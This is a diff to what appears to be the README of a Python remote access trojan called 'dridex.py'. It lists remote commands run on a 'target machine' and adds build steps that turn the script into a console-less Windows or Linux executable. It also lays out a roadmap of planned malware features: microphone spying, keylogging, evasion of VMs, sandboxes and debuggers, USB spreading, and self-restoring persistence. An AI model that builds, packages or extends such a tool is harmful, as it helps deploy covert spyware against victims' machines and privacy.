@@ -28,3 +28,22 @@ EXTRA COMMANDS:
 2) whoami
 3) show a message on target machine: message <text (example: hello)>
 4) alert on target system: alert <text (example: hello)>
+
+command to make it.py to.exe correctly (not obfuscated):
+
+Windows:
+- python.exe pyinstaller --onefile --noconsole dridex.py
+
+Linux:
+- pyinstaller --onefile --noconsole dridex.py
+
+WHAT WILL I ADD/UPGRADE:
+
+- Microphone spy
+- Keylogger
+- No VM
+- No Sandbox
+- No Debugger
+- File Uploader (u can already upload files using curl or wget (example: exec wget/curl ...)
+- USB Spread
+- Persistence (if the file is deleted thanks to another file, it will be recomposed as if nothing had happened)
